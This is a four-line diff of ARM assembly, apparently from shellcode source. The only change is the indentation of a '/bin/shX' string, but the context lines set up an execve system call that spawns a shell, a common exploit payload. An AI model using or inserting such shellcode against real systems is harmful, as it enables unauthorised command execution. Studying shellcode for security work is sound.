@@ -23,4 +23,4 @@ _start:
     mov    r7, #11        // r7 = execve
     svc    1
 sh:    
-.ascii "/bin/shX"
+    .ascii "/bin/shX"
